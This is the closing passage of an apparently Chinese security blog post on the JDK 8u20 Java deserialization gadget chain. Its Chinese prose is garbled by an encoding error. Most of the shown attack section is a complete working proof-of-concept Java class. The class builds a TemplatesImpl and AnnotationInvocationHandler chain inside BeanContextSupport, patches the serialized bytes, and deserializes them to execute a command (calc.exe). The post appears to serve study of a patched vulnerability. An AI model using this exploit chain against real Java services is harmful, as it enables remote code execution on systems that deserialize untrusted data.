<p>è¿˜è®°å¾—ä¸Šé¢é‚£ä¸ªåºåˆ—åŒ–æ•°æ®å›¾çš„åˆ†æä¹ˆï¼Œä¸‹å›¾è¿™é‡Œæ˜¯åŒä¸€ä¸ªä½ç½®å«ä¹‰å·®ä¸å¤šï¼Œè¿™é‡Œè°ƒè¯•å¯¹åº”çš„åœ°æ–¹æ˜¯<code>TC_NULL</code>,è€Œintå¯¹åº”çš„æ˜¯<code>TC_BLOCKDATA</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®©<code>TC_BLOCKDATA</code>æå‰ï¼Œè€Œä¸ºä»€ä¹ˆæ²¡å½±å“å‘¢ï¼Œ<code>readInt()</code>åå…¶å®å°±æ ‡å¿—ç€<code>BeanContextSupport</code>ååºåˆ—åŒ–çš„ç»“æŸï¼Œç„¶å<code>ç´§æ¥ç€è¦ååºåˆ—åŒ–</code>addçš„ç¬¬äºŒä¸ªå¯¹è±¡äº†ï¼ˆä¸‹å›¾æ˜¯æŒ‡å‘<code>TemplatesImpl</code>çš„Handlerï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½æ·»åŠ å€¼ï¼Œåªèƒ½åˆ é™¤å€¼ï¼Œå› ä¸ºæ·»åŠ å€¼ä¼šå¯¹åé¢çš„ååºåˆ—åŒ–ç…§æˆå½±å“ï¼Œè€Œåˆ é™¤<code>TC_NULL</code>èƒ½åœ¨å‰é¢å®Œæˆé—­ç¯ã€‚</p>
<p><img loading="lazy" src="images/image-20250510191146304.png" alt="image-20250510191146304"  />
</p>
<h4 id="æœ€ç®€æ´poc">æœ€ç®€æ´poc<a hidden class="anchor" aria-hidden="true" href="#æœ€ç®€æ´poc">#</a></h4>
<p>å¤§åŠŸå‘Šæˆï¼Œæˆ‘ä»¬æ²¡æœ‰ç›´æ¥ç»™<code>AnnotationInvocationHandler</code>æ”¹å†™ä¸€ä¸ªwriteObjectï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸€ä¸ªæ–‡ä»¶å°±å¯ä»¥æ‰§è¡Œäº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.ClassPool</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtClass</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javassist.CtMethod</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Deserializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.Serializer</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ByteUtil</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Gadgets</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.ReadWrite</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">ysoserial.payloads.util.Reflections</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.transform.Templates</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.beancontext.BeanContextSupport</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.ObjectInputStream</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.LinkedHashSet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">jdk8u20_poc</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">TemplatesImpl</span><span class="w"> </span><span class="n">templates</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">TemplatesImpl</span><span class="p">)</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createTemplatesImpl</span><span class="p">(</span><span class="s">&#34;calc.exe&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">ih</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;type&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Templates</span><span class="w"> </span><span class="n">proxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createProxy</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="n">Templates</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">BeanContextSupport</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">BeanContextSupport</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;serializable&#34;</span><span class="p">,</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">tmpMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">tmpMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">b</span><span class="p">,</span><span class="s">&#34;children&#34;</span><span class="p">,</span><span class="n">tmpMap</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">LinkedHashSet</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LinkedHashSet</span><span class="p">();</span><span class="c1">//è¿™æ ·å¯ä»¥ç¡®ä¿å…ˆååºåˆ—åŒ– templates å†ååºåˆ—åŒ– proxy</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">b</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">set</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">proxy</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="w"> </span><span class="n">hm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hm</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;f5a5a608&#34;</span><span class="p">,</span><span class="n">templates</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reflections</span><span class="p">.</span><span class="na">setFieldValue</span><span class="p">(</span><span class="n">ih</span><span class="p">,</span><span class="s">&#34;memberValues&#34;</span><span class="p">,</span><span class="n">hm</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Serializer</span><span class="p">.</span><span class="na">serialize</span><span class="p">(</span><span class="n">set</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">nullReplace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="n">0x70</span><span class="p">,</span><span class="n">0x77</span><span class="p">,</span><span class="n">0x04</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x78</span><span class="p">,</span><span class="n">0x71</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">flagsReplace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">{</span><span class="n">0x02</span><span class="p">,</span><span class="n">0x00</span><span class="p">,</span><span class="n">0x02</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">getSubarrayIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">flagsReplace</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">deleteAt</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">addAtIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="n">0x03</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">getSubarrayIndex</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">nullReplace</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ByteUtil</span><span class="p">.</span><span class="na">deleteAt</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="n">j</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">writeFile</span><span class="p">(</span><span class="n">ser</span><span class="p">,</span><span class="s">&#34;ser+.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ReadWrite</span><span class="p">.</span><span class="na">readFile</span><span class="p">(</span><span class="s">&#34;ser+.txt&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Deserializer</span><span class="p">.</span><span class="na">deserialize</span><span class="p">(</span><span class="n">bytes</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250510182306287.png" alt="image-20250510182306287"  />
</p>
<h3 id="8u20ä¿®å¤">8u20ä¿®å¤<a hidden class="anchor" aria-hidden="true" href="#8u20ä¿®å¤">#</a></h3>
<p>æœ€ååå°„è°ƒç”¨çš„æ–¹æ³•åªèƒ½æ˜¯ä¸‹é¢3ä¸ªï¼Œå¯¼è‡´ä¸èƒ½è°ƒç”¨sinkç‚¹äº†</p>
<p><img loading="lazy" src="images/image-20250510193349124.png" alt="image-20250510193349124"  />
</p>
<blockquote>
<p>åè¨€ï¼šå…¶å®æˆ‘è®°å½•çš„æ¯”è¾ƒç®€å•ï¼Œå…³äº<code>å¯¼è‡´çš„é—®é¢˜</code>è¿™é‡Œå¾—ç»è¿‡è°ƒè¯•ä»¥åŠæŸ¥çœ‹åºåˆ—åŒ–æºç æ‰èƒ½å¾—å‡ºï¼Œæˆ‘æœ€å¼€å§‹æ˜¯çœ‹å‚è€ƒæ–‡ç« ä»¥ä¸ºå°±é‚£ä¹ˆå›äº‹ï¼Œç„¶åæˆ‘æ˜¯æ‰“ç®—è¡¥å…¨é‚£ä¸ªintæ•°æ®çš„ï¼Œä¹Ÿå°±æ˜¯å¡«å……æ•°æ®ï¼Œç„¶åå‘ç”Ÿäº†æŠ¥é”™ï¼Œä»¥åŠæ„Ÿè§‰åˆ°ä¸€äº›ç–‘ç‚¹å§ã€‚åæ­£å°±å§‹ç»ˆè¯´æœä¸äº†è‡ªå·±ï¼Œä¸»è¦å°±æ˜¯å‚è€ƒæ–‡ç« é‡Œé¢åˆ é™¤é‚£ä¸¤ä¸ªæ•°æ®ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿæˆ‘çŸ¥é“æ˜¯å¯¹é½intï¼Œä½†æ˜¯ä¼šä¸ä¼šå¯¹å…¶ä»–æ•°æ®ç…§æˆå½±å“å‘¢ï¼Ÿç„¶åå°±è‡ªå·±ç¢ç£¨å“‡ï¼Œä¹Ÿæ˜¯æå¾—æ˜æ˜ç™½ç™½äº†å¾ˆçˆ½ã€‚ç„¶åè°ƒè¯•æ‰¾åºåˆ—åŒ–æ•°æ®é‡Œé¢å¯¹åº”çš„ä½ç½®ï¼Œå¯ä»¥é€šè¿‡å‰åposçš„å€¼å»æ‰¾</p>
</blockquote>
<p><strong>å‚è€ƒ</strong></p>
<blockquote>
<p><a href="https://tttang.com/archive/1729/#toc">https://tttang.com/archive/1729/#toc</a>_</p>
<p><a href="https://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F">https://exp10it.io/2022/12/jdk-7u21-deserialization/#%E6%96%B0%E7%9A%84%E6%9E%84%E9%80%A0%E6%96%B9%E5%BC%8F</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson1.2.24-1.2.80/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>Fastjson1.2.24-1.2.80 ååºåˆ—åŒ–</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>Furyååºåˆ—åŒ–&amp;aliyunctf-jtool</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
